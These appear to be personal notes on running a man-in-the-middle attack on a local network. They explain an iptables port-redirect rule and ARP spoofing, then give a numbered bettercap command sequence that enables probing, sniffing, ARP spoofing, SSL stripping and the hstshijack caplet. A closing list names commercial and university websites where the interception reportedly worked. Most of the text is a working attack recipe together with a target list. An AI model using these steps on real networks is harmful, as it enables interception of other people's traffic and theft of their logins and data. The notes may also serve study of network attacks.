iptables affects the host where the command is executed. It modifies how that machine handles incoming and outgoing packets.

iptables -t nat -A PREROUTING -p tcp --destination-port n - j REDIRECT --to-port N

iptables — modifies the NAT (Network Address Translation) table to redirect incoming TCP traffic on port port  n (in our case 80) over to to port N. 

—

-A PREROUTING — appends a rule to the prerouting chain, which processes packets before they are routed

-p tcp — specifies that the rule applies to tcp packets

-j redirect — specifies that packets should be redirected

arpspoof works at a low level, manipulating the ARP table entries of devices on the local network to redirect traffic without altering firewall rules or packet processing at higher layers.

manipulates the ARP tables of devices on the local network to make them believe that your machine's MAC address corresponds to another device's IP address (like the router or another host)

net.probe enables network probing within bettercap, allowing the tool to discover devices on the network by sending arp requests and listening for responses

net.sniff activates packet sniffing, so bettercap will start capturing and analyzing the traffic flowing through the network

#### Bettercap Steps:
0. sudo bettercap -iface eth0
1. help
2. caplets.show
3. set http.proxy.sslstrip true
4. hstshijack/hstshijack
5. help
6. net.probe on
7. net.sniff on
8. arp.spoof on


#### Working Sites
Sites that worked:
alibaba
foxnews
ign.com
speedtest.com

Institutional Sites:
carleton.edu
mit.edu
washington.edu
and most likely more…
